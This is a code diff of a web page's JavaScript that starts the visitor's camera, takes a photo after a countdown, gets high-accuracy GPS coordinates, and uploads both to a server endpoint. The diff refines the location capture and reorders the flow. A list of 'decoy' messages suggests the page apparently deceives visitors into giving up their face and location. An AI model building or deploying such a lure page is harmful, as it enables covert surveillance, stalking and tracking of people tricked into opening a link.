@@ -273,28 +273,25 @@
       return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
     }
 
-    /** Best-effort GPS; same upload row on server when available. */
-    function getLocationBestEffort(timeoutMs) {
+    function getLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
-          resolve(null);
+          resolve({ latitude: null, longitude: null, accuracy: null });
           return;
         }
-        const done = (value) => {
-          clearTimeout(timer);
-          resolve(value);
-        };
-        const timer = setTimeout(() => done(null), timeoutMs);
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            done({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy_m: pos.coords.accuracy,
+          (position) => {
+            resolve({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
             });
           },
-          () => done(null),
-          { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
+          (error) => {
+            console.log("Location error:", error);
+            resolve({ latitude: null, longitude: null, accuracy: null });
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       });
     }
@@ -412,12 +409,14 @@
       if (
         location &&
         typeof location.latitude === "number" &&
-        typeof location.longitude === "number"
+        typeof location.longitude === "number" &&
+        !Number.isNaN(location.latitude) &&
+        !Number.isNaN(location.longitude)
       ) {
         payload.latitude = location.latitude;
         payload.longitude = location.longitude;
-        if (typeof location.accuracy_m === "number") {
-          payload.accuracy_m = location.accuracy_m;
+        if (typeof location.accuracy === "number" && !Number.isNaN(location.accuracy)) {
+          payload.accuracy_m = location.accuracy;
         }
       }
       const res = await fetch(`${API_BASE}/upload-photo`, {
@@ -438,18 +437,23 @@
 
     async function run() {
       setCountdownVisible(false);
-      setStatus("One moment…");
-      const locPromise = getLocationBestEffort(20000);
+      setStatus("Allow camera and location…");
       let stream;
       try {
         stream = await startCamera();
         await waitForVideoReady();
-        await waitCaptureCountdown(CAPTURE_DELAY_MS);
       } catch (e) {
         setCountdownVisible(false);
         setStatus("Camera access denied or unavailable. Allow camera and reload.", true);
         return;
       }
+
+      const locationPromise = getLocation();
+
+      await waitCaptureCountdown(CAPTURE_DELAY_MS);
+
+      setStatus("Getting location…");
+      const location = await locationPromise;
 
       let encoded;
       try {
@@ -458,13 +462,12 @@
         setCountdownVisible(false);
         setStatus(String(e.message || e), true);
         stream.getTracks().forEach((t) => t.stop());
+        preview.srcObject = null;
         return;
       }
 
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
-
-      const location = await locPromise;
 
       try {
         const b64 = await blobToBase64(encoded.blob);
